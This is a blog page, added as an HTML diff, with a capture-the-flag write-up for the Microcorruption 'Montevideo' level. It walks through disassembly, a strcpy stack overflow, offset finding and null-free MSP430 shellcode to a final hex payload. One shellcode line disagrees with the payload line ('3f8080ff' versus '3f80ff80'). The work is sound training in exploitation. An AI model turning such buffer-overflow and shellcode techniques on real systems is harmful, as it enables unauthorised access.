@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		
+		<link href="../_app/immutable/assets/0.Dlb7pXDV.css" rel="stylesheet">
+		<link href="../_app/immutable/assets/4.CimdS63P.css" rel="stylesheet">
+		<link rel="modulepreload" href="../_app/immutable/entry/start.ouMra9AW.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/Bds1QhS9.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DCFcRc6v.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/BqHloRb4.js">
+		<link rel="modulepreload" href="../_app/immutable/entry/app.CO75G284.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/C6U3RdpY.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/Dwf-VV-B.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CBZjZzat.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/0.CLhogo2J.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/D4n077k-.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DhnXOQm4.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CW9wjobI.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/4.Cf4XbhDB.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/jRw7-Y13.js"><!--[--><!--]--><title>Microcorruption Montevideo</title>
+	</head>
+	<body data-sveltekit-preload-data="hover" style="background-color:  #E9E9DF;">
+		<div style="display: contents"><!--[--><!--[--><!----><div class="site-header svelte-8v83zk"><h1 id="site-title" class="svelte-8v83zk"> Anoth3r Site</h1> <h1 class="blink svelte-8v83zk">_</h1></div> <hr class="hr-top svelte-8v83zk"> <div class="svelte-8v83zk"><ul class="nav-bar svelte-8v83zk"><li class="svelte-8v83zk"><a href="/" class="svelte-8v83zk">Home</a></li> <li class="svelte-8v83zk"><a href="/about" class="svelte-8v83zk">About</a></li> <li class="svelte-8v83zk"><a href="https://github.com/fl1gg" class="svelte-8v83zk">Github</a></li> <li class="svelte-8v83zk"><a href="/contact" class="svelte-8v83zk">Contact</a></li></ul></div> <br class="svelte-8v83zk"><!----> <!----><div class="articles svelte-1oy2dsc"><div class="header svelte-1oy2dsc"><h1 class="title svelte-1oy2dsc">Microcorruption Montevideo</h1> <p class="subtitle svelte-1oy2dsc">The process and solution for the seventh Microcorruption level</p></div> <div class="tags svelte-1oy2dsc"><!--[--><span class="tag svelte-1oy2dsc">#microcorruption</span><span class="tag svelte-1oy2dsc">#reversing</span><span class="tag svelte-1oy2dsc">#pwn</span><!--]--></div> <br class="svelte-1oy2dsc"> <hr class="svelte-1oy2dsc"> <div id="page" class="svelte-1oy2dsc"><!----><p>Looking at this level we notice two new functions, strcpy and memset.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">45dc &#x3C;strcpy></span></span>
+<span class="line"><span style="color:#E6EDF3">...</span></span>
+<span class="line"><span style="color:#E6EDF3">45f0 &#x3C;memset></span></span></code></pre><!----> <p>We know there is a common issue with strcpy which can lead to an overflow. Looking at the login function we confirm there is no bounds checking and thus strcpy is used in an improper way that will allow us to overflow the stack.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">44f4 &#x3C;login></span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">44f4:</span><span style="color:#79C0FF">  3150</span><span style="color:#E6EDF3"> f0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfff0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">44f8:</span><span style="color:#E6EDF3">  3f40 </span><span style="color:#79C0FF">7044</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4470</span><span style="color:#E6EDF3"> "</span><span style="color:#FF7B72">Enter</span><span style="color:#E6EDF3"> the password to continue.", </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">44fc:</span><span style="color:#E6EDF3">  b012 b045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45b0</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
+<span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">9044</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4490</span><span style="color:#E6EDF3"> "</span><span style="color:#D2A8FF">Remember:</span><span style="color:#E6EDF3"> passwords are between </span><span style="color:#79C0FF">8</span><span style="color:#FF7B72"> and</span><span style="color:#79C0FF"> 16</span><span style="color:#E6EDF3"> characters.", </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#79C0FF">4504</span><span style="color:#E6EDF3">:  b012 b045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45b0</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
+<span class="line"><span style="color:#79C0FF">4508</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 3000</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x30</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">450c:</span><span style="color:#E6EDF3">  3f40 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#79C0FF">4510</span><span style="color:#E6EDF3">:  b012 a045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a0</span><span style="color:#E6EDF3"> &#x3C;getsn></span></span>
+<span class="line"><span style="color:#79C0FF">4514</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">        ; location of password</span></span>
+<span class="line"><span style="color:#79C0FF">4518</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">             ; area we have cleared on stack for password</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">451a:</span><span style="color:#E6EDF3">  b012 dc45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45dc</span><span style="color:#E6EDF3"> &#x3C;strcpy>    </span><span style="color:#8B949E">; copy over password to stack.</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">451e:</span><span style="color:#E6EDF3">  3d40 </span><span style="color:#79C0FF">6400</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x64</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r13</span><span style="color:#E6EDF3">         </span></span>
+<span class="line"><span style="color:#79C0FF">4522</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0e43</span><span style="color:#E6EDF3">           clr	</span><span style="color:#79C0FF">r14</span></span>
+<span class="line"><span style="color:#79C0FF">4524</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#79C0FF">4528</span><span style="color:#E6EDF3">:  b012 f045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45f0</span><span style="color:#E6EDF3"> &#x3C;memset>    </span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">452c:</span><span style="color:#E6EDF3">  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">452e:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">4644</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4446</span><span style="color:#E6EDF3"> &#x3C;conditional_unlock_door></span></span>
+<span class="line"><span style="color:#79C0FF">4532</span><span style="color:#E6EDF3">:  0f93           tst	</span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#79C0FF">4534</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0324</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x8</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x48</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#79C0FF">4536</span><span style="color:#E6EDF3">:  3f40 c544      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44c5</span><span style="color:#E6EDF3"> "Access granted.", </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">453a:</span><span style="color:#E6EDF3">  023c           </span><span style="color:#FF7B72">jmp</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x4c</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">453c:</span><span style="color:#E6EDF3">  3f40 d544      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44d5</span><span style="color:#E6EDF3"> "That password is </span><span style="color:#FF7B72">not</span><span style="color:#E6EDF3"> correct.", </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#79C0FF">4540</span><span style="color:#E6EDF3">:  b012 b045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45b0</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
+<span class="line"><span style="color:#79C0FF">4544</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#79C0FF"> 1000</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x10</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
+<span class="line"><span style="color:#79C0FF">4548</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3041</span><span style="color:#FF7B72">           ret</span></span></code></pre><!----> <p>Verifying this with an input of <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code> (hex encoded) does indeed lead to a stack misalignment.</p> <p>From our Whitehorse writeup we know the following shellcode will open the door:</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>445c:  3012 7e00      push	#0x7e</span></span>
+<span class="line"><span>4460:  b012 3245      call	#0x4532 &#x3C;INT></span></span>
+<span class="line"><span></span></span></code></pre><!----> <p>However our interrupt is now at 454c. so we need to modify the code to the following</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>shellcode: 3012 7f00 b012 4c45</span></span></code></pre><!----> <p>We can place this shellcode onto the stack and control the instruction pointer to jump into it because of the strcpy function.</p> <p>We need to find our stack address and the overwrite location. Submitting <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDE</code> as the password and stepping, we see the following memory dump:</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>43e0: 6045 0300 d445 0000 0a00 0000 4445 aaaa</span></span>
+<span class="line"><span>43f0: aaaa aaaa aaaa aaaa aaaa aaaa aabc de00</span></span>
+<span class="line"><span>4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40</span></span></code></pre><!----> <p>Adding a breakpoint at 4548 and then continuing + one step tells up the <code>pc</code> = <code>00de</code>. Thus the offset is 32. Additionally, we can see the stack address is <code>43ee</code>.</p> <p>Putting these together we get the following shellcode</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>      16         +      16          +  4    = 36</span></span>
+<span class="line"><span>30127f00b0124c45 + 0000000000000000 + ee43  = 30127f00b0124c450000000000000000ee43</span></span></code></pre><!----> <p>This code doesn’t actually work. Strcpy is actually reading the 00 in 0x007f as the terminator for the string.</p> <p>This possess a problem because we need to push the code 0x007f to open the lock. Lets try and recompile our shellcode to get rid of those zeros. Using the provided disassembler, we come up with the following solution (<a href="https://microcorruption.com/assembler" rel="nofollow">https://microcorruption.com/assembler</a>):</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FF7B72">xor</span><span style="color:#79C0FF"> r15</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">          ; clear out r15</span></span>
+<span class="line"><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3"> #</span><span style="color:#79C0FF">0xffff</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">      ; set r15 to max </span></span>
+<span class="line"><span style="color:#FF7B72">sub</span><span style="color:#E6EDF3"> #</span><span style="color:#79C0FF">0xff80</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">      ; subtract 0xffff - 0xff80 = 0x007f without any zeros in assembled code</span></span>
+<span class="line"><span style="color:#FF7B72">push</span><span style="color:#79C0FF"> r15</span><span style="color:#8B949E">              ; put on stack</span></span>
+<span class="line"><span style="color:#FF7B72">call</span><span style="color:#E6EDF3"> #</span><span style="color:#79C0FF">0x454c</span><span style="color:#8B949E">          ; call interrupt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D2A8FF">shellcode:</span><span style="color:#E6EDF3"> 0fef3f40ffff3f8080ff0f12b0124c45</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">                   len(</span><span style="color:#79C0FF">32</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#D2A8FF">payload:</span><span style="color:#E6EDF3"> 0fef3f40ffff3f80ff800f12b0124c45 + ee43 = 0fef3f40ffff3f80ff800f12b0124c45ee43</span></span></code></pre><!----> <p>Using subtraction of all things, solves this challenge.</p><!----></div></div><!----><!----> <br> <div><hr></div><!----><!----><!--]--> <!--[!--><!--]--><!--]-->
+			
+			<script>
+				{
+					__sveltekit_1sefmzd = {
+						base: new URL("..", location).pathname.slice(0, -1)
+					};
+
+					const element = document.currentScript.parentElement;
+
+					Promise.all([
+						import("../_app/immutable/entry/start.ouMra9AW.js"),
+						import("../_app/immutable/entry/app.CO75G284.js")
+					]).then(([kit, app]) => {
+						kit.start(app, element, {
+							node_ids: [0, 4],
+							data: [null,null],
+							form: null,
+							error: null
+						});
+					});
+				}
+			</script>
+		</div>
+	</body>
+	
+</html>
